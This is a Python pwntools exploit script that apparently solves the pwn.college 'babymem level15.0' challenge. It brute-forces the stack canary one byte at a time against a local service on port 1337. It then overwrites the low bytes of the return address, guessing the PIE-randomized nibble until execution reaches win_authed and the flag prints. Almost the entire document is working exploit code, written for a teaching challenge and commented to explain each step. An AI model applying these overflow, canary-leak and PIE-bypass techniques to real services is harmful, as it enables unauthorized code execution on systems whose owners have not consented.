#/usr/bin/python3
from pwn import *

# Retrieve the ELF information from the binary and run it
elf = ELF('/challenge/babymem_level15.0')
io = elf.process()

# Set the first two bytes to use in the return address
base_address = b"\xb8\x08"

# Compute the distance from the buffer to the canary on the stack
buffer_offset = 0x68
canary_offset = 0x10
canary_distance = buffer_offset - canary_offset

# Initialize the canary byte to guess and the canary initial value
canary_guess = 0
canary = b''

# Until we haven't leaked the entire canary
# NOTE: in order to leak the canary value we guess each one of its bytes one at a time.
while len(canary) < 8: 
    # Connect to the remote program
    conn = remote('127.0.0.1', 1337)

    # Send the payload size as: canary_distance + length_of_discovered_canary + 1
    # NOTE: in this way we reach the canary's byte we want to leak
    conn.recvuntil(b'Payload size: ')
    conn.sendline(f"{canary_distance + len(canary) + 1}".encode())

    # Build and send the payload to the program as:
    # padding_bytes + current_leaked_canary + current_canary_byte_guess
    PAYLOAD = b'A'*(canary_distance) + canary + p8(canary_guess)
    conn.recvuntil(b'bytes)!')
    conn.sendline(PAYLOAD)

    # Retrieve the output of the program
    conn.recvuntil(b'Goodbye!')
    value_found = conn.recvall(timeout=1).decode()

    print("************************")
    print(f"Current canary guess: {canary_guess}")
    print(f"Current canary: {canary}")
    print("************************")

    # Check if the guessed value was correct
    if '*** stack smashing detected ***: terminated' in value_found:
        # If there is a stack smash then try the next value
        canary_guess += 1
    else:
        # If there isn't a stack smash then add the current 
        # guess to the canary
        canary += p8(canary_guess)
        canary_guess = 0
        
print(f"************************\nCANARY FOUND: {canary}\n************************")

# Initialize the 4th nibble to guess
nibble_guess = 0

# NOTE: because the binary uses PIE (Positional Independent Execution) we have to
#       try multiple times until the win_authed function will be loaded in our guessed
#       address.
#       This can be done because the addresses are aligned 0x1000, then the first 3 nibbles
#       are fixed and the 4th changes every execution.
while True:
    # Connect to the remote program
    conn = remote('127.0.0.1', 1337)

    # Send the payload size
    conn.recvuntil(b'Payload size: ')
    conn.sendline(f"{buffer_offset + 2}".encode())

    # Build the current value to write as the first two bytes of the return address
    # NOTE: because we can't restart all the program each time, we have to change the
    #       new return address every time. The first byte is fixed, instead the second 
    #       one has the first nibble (4 bit) fixed and the second nibble
    #       that changes every execution.
    win_address = p8(base_address[0]) + p8(base_address[1] + 16 * nibble_guess)

    print("************************")
    print(f"Nibble guess: {nibble_guess}")
    print(f"Return address guess: {win_address}")
    print(f"Canary in use: {canary}")
    print("************************")

    # Build and send the payload to the program
    PAYLOAD = b'A'*canary_distance + canary + b'A'*8 + win_address
    conn.recvuntil(b'bytes)!')
    conn.sendline(PAYLOAD)

    # Retrieve the possible flag
    conn.recvuntil(b'Goodbye!')
    flag = conn.recvall(timeout=1).decode()

    # Check if the flag has been retrieved correctly
    if "pwn.college" in flag:
        print(flag)
        break
    
    # Change the value of the nibble to guess
    nibble_guess += 1